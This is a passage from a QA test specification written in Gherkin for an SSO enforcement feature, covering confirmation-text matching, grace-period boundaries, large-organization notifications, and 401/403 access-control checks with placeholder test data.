    When I type "ENABLE SSO ENFORCEMENT" (extra text)
    Then the "Confirm" button remains disabled
    And only exact match "ENABLE SSO" enables the confirmation button
```

**Test Data:**
- Required text: "ENABLE SSO" (case-sensitive, exact match)
- Invalid inputs: "enable sso", "ENABLE SSO ENFORCEMENT", "Enable SSO"

### T-11.3: Authentication Attempt on Disabled Organization
**Maps to:** AC-3
**Category:** edge-case

```gherkin
  Scenario: User from non-SSO-enforced organization can still use password
    Given organization "org-456" (different from enforced org) has SSO enforcement disabled
    And user "user-789" belongs to organization "org-456"
    When the user attempts to log in with email "user@org456.com" and password "correctPassword123"
    Then the login attempt succeeds
    And the user is authenticated with password method
    And no SSO enforcement warnings or redirects occur
    And the user proceeds to their normal dashboard
```

**Test Data:**
- Different organization: `{ id: "org-456", sso_enforcement_enabled: false }`
- User from different org: `{ id: "user-789", email: "user@org456.com", org_id: "org-456" }`

## Boundary Tests

### T-12.1: Grace Period Edge Case - Exact Expiration Time
**Maps to:** AC-5
**Category:** boundary

```gherkin
Feature: Grace Period Boundary Conditions

  Scenario: Authentication at exact grace period expiration moment
    Given organization "org-123" has SSO enforcement with 7-day grace period
    And the enforcement was enabled exactly 7 days ago at "2026-06-08T10:00:00Z"
    And current time is exactly "2026-06-15T10:00:00Z" (grace period expiration)
    When user "user-456" attempts password authentication at this exact moment
    Then the authentication is blocked (grace period has expired)
    And the user receives SSO enforcement message
    And no grace period warning is shown (period has ended)
```

**Test Data:**
- Precise timing: `{ grace_period_enabled_at: "2026-06-08T10:00:00Z", grace_period_days: 7, current_time: "2026-06-15T10:00:00Z" }`

### T-12.2: Maximum Users Organization
**Maps to:** AC-2, AC-4
**Category:** boundary

```gherkin
  Scenario: SSO enforcement on organization with maximum user count
    Given organization "org-enterprise" has 10000 users (maximum allowed)
    And all 10000 users currently use email/password authentication
    And I am an organization admin attempting to enable SSO enforcement
    When I toggle enforcement and see the confirmation dialog
    Then the dialog shows "This will affect 10000 users in your organization"
    And confirmation still requires typing "ENABLE SSO"
    When I confirm enforcement enabling
    Then 10000 migration notification emails are queued for delivery
    And the system handles the bulk email operation without timeout
```

**Test Data:**
- Large organization: `{ id: "org-enterprise", user_count: 10000, max_allowed_users: 10000 }`
- Bulk email system: should handle 10k emails within reasonable time

## Authorization Tests

### T-9.1: Unauthenticated User Blocked from SSO Enforcement Configuration
**Maps to:** AC-AUTH-1
**Category:** security

```gherkin
Feature: Authentication Requirements

  Scenario: Unauthenticated request to SSO enforcement endpoint rejected
    Given no authentication token is provided in the request headers
    When a request is made to "POST /api/admin/sso/enforcement/enable"
    Then the response status code is 401 Unauthorized
    And the response body contains: "Authentication required"
    And no changes are made to any organization SSO enforcement settings
    And the request is logged as an unauthorized access attempt
```

**Test Data:**
- Request: `POST /api/admin/sso/enforcement/enable` with no Authorization header
- Expected response: `{ status: 401, error: "Authentication required" }`

**Preconditions:**
- No valid authentication token in request
- SSO enforcement endpoint is accessible

### T-9.2: Invalid Token Rejected
**Maps to:** AC-AUTH-1
**Category:** security

```gherkin
  Scenario: Invalid authentication token rejected from SSO enforcement endpoints
    Given an invalid or expired authentication token "invalid-jwt-token-123"
    When a request is made to "GET /api/admin/sso/enforcement/status" with the invalid token
    Then the response status code is 401 Unauthorized
    And the response body contains: "Invalid or expired token"
    And no SSO enforcement status information is returned
```

**Test Data:**
- Invalid token: "invalid-jwt-token-123"
- Request: `GET /api/admin/sso/enforcement/status` with Authorization: Bearer invalid-jwt-token-123

### T-10.1: Non-Admin User Blocked from SSO Enforcement Configuration
**Maps to:** AC-AUTH-2
**Category:** security

```gherkin
Feature: Authorization Requirements

  Scenario: Regular user without admin role blocked from SSO enforcement settings
    Given I am authenticated as a regular user with ID "user-456" and role "user"
    And the user belongs to organization "org-123"
    When I attempt to access "GET /api/admin/sso/enforcement/status"
    Then the response status code is 403 Forbidden
    And the response body contains: "Organization admin permission required"
    And the response identifies the missing permission: "organization_admin"
    And no SSO enforcement status data is returned
```

**Test Data:**
- Regular user: `{ id: "user-456", email: "user@org123.com", role: "user", org_id: "org-123" }`
- Request: authenticated but insufficient role
- Expected response: `{ status: 403, error: "Organization admin permission required", required_permission: "organization_admin" }`

**Preconditions:**
- User has valid authentication but lacks admin privileges

### T-10.2: Admin from Different Organization Blocked
**Maps to:** AC-AUTH-2
**Category:** security

```gherkin
  Scenario: Admin from different organization cannot modify SSO enforcement
    Given I am authenticated as an organization admin with ID "admin-002" 
    And I have organization_admin role for organization "org-456"
    And I attempt to modify SSO enforcement for organization "org-123" (different org)
    When I make a request to "POST /api/admin/sso/enforcement/enable" for org-123
    Then the response status code is 403 Forbidden
    And the response body contains: "Organization admin permission required for target organization"
    And no changes are made to organization "org-123" SSO enforcement settings
```

**Test Data:**
- Admin user: `{ id: "admin-002", email: "admin@org456.com", role: "organization_admin", org_id: "org-456" }`
- Target organization: "org-123" (different from admin's org)
- Cross-org access should be blocked

**Preconditions:**
- Admin has valid role but for different organization
- Attempting to modify settings for organization they don't administer


